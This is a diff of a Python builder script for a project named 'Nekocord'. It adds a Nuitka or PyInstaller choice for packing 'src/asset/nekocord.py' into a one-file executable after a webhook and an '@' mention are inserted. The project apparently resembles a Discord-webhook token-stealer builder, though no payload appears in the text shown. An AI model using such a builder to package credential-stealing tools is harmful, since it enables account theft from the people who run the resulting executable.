@@ -10,6 +10,15 @@ import shutil
 colorama.init(autoreset=True)
 os.system("cls" if os.name == "nt" else "clear")
 
+ascii_art = """
+                        ███╗   ██╗███████╗██╗  ██╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
+                        ████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
+                        ██╔██╗ ██║█████╗  █████╔╝ ██║   ██║██║     ██║   ██║██████╔╝██║  ██║
+                        ██║╚██╗██║██╔══╝  ██╔═██╗ ██║   ██║██║     ██║   ██║██╔══██╗██║  ██║
+                        ██║ ╚████║███████╗██║  ██╗╚██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝
+                        ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
+"""
+
 def remote_v_string():
     url = "https://raw.githubusercontent.com/zakocord/Nekocord/main/extra/v_string"
     response = requests.get(url)
@@ -59,7 +68,7 @@ def update():
 
     if local_v != remote_v:
         os.system("title Update Available")
-        print(f"{Fore.CYAN}[INFO] Update available: {local_v} → {remote_v}")
+        print(f"{Fore.CYAN}[INFO] Update available: {local_v or 'None'} → {remote_v}")
         choice = input("Update? (y/n): ").strip().lower()
         if choice == 'y':
             download_and_extract_zip()
@@ -67,18 +76,20 @@ def update():
         else:
             print("Update cancelled.")
             os.system("cls")
-            os.system("nekocord")
+            os.system("title nekocord")
     else:
-        print(f"{Fore.GREEN}[INFO] You're already up-to-date.")
+        print(f"{Fore.YELLOW}[INFO]{Fore.RESET} Version-{local_v}")
 
-ascii_art = """
-                        ███╗   ██╗███████╗██╗  ██╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
-                        ████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
-                        ██╔██╗ ██║█████╗  █████╔╝ ██║   ██║██║     ██║   ██║██████╔╝██║  ██║
-                        ██║╚██╗██║██╔══╝  ██╔═██╗ ██║   ██║██║     ██║   ██║██╔══██╗██║  ██║
-                        ██║ ╚████║███████╗██║  ██╗╚██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝
-                        ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
-"""
+def build_exe(build_tool, command):
+    print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Building with {build_tool}...")
+
+    try:
+        subprocess.run(command, check=True)
+        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully built the executable.")
+    except subprocess.CalledProcessError:
+        print(f"{Fore.YELLOW}[WARN] {Fore.RESET} Failed to build the executable. Ensure {build_tool} is installed.")
+    except FileNotFoundError:
+        print(f"{Fore.RED}[ERROR] {Fore.RESET} {build_tool} is not found. Please install it.")
 
 def replace_hook_in_main():
     while True:
@@ -95,6 +106,19 @@ def replace_hook_in_main():
         if not mention.startswith("@"):
             print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The mention should start with '@'. Please try again.")
             continue
+
+        buildtype = input(f"{Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}\n Build Type  [Nuitka/Pyinstaller]: ").strip().lower()
+
+        if buildtype in ["nuitka", "pyinstaller"]:
+            confirm_build = input(f"{Fore.CYAN}[INFO] {Fore.RESET} Do you want to build with {buildtype}? (y/n): ").strip().lower()
+            if confirm_build == "y":
+                if buildtype in ["py", "pyinstaller"]:
+                    build_exe("PyInstaller", ["pyinstaller", "--onefile", "src/asset/nekocord.py"])
+                else:
+                    build_exe("Nuitka", ["nuitka", "--onefile", "src/asset/nekocord.py"])
+            else:
+                print(f"{Fore.YELLOW}[INFO] {Fore.RESET} Build cancelled.")
+                continue
 
         break
 
@@ -116,19 +140,6 @@ def replace_hook_in_main():
         print(f"{Fore.RED}[ERROR] {Fore.RESET} The file 'src/asset/nekocord.py' was not found.")
     except IOError as e:
         print(f"{Fore.RED}[ERROR] {Fore.RESET} Error reading/writing the file: {e}")
-
-def build_exe():
-    print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Building src/asset/nekocord.py with PyInstaller...")
-
-    try:
-        subprocess.run(["pyinstaller", "--onefile", "src/asset/nekocord.py"], check=True)
-        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully built the executable.")
-    except subprocess.CalledProcessError:
-        print(f"{Fore.YELLOW}[WARN] {Fore.RESET} Failed to build the executable. Ensure pyinstaller is installed.")
-    except FileNotFoundError:
-        print(f"{Fore.RED}[ERROR] {Fore.RESET} pyinstaller is not found. Please install it using 'pip install pyinstaller'.")
-
 if __name__ == "__main__":
     update()
     replace_hook_in_main()
-    build_exe()
